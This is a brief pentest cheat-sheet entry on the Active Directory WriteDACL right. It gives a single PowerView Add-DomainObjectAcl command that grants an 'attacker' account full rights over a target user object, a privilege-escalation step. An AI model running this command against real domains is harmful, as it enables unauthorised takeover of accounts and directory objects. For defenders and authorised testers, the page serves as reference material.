# WriteDACL

The **WriteDACL** permission allows a user to modify the Discretionary Access Control List (DACL) of an object. The DACL defines who has what permissions over that object. By modifying the DACL, a user can grant themselves or others additional rights over the object.

User PowerView.ps1 to modify DACL

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=targetuser,CN=Users,DC=example,DC=com" -PrincipalIdentity "CN=attacker,CN=Users,DC=example,DC=com" -Rights All
```
{% endcode %}

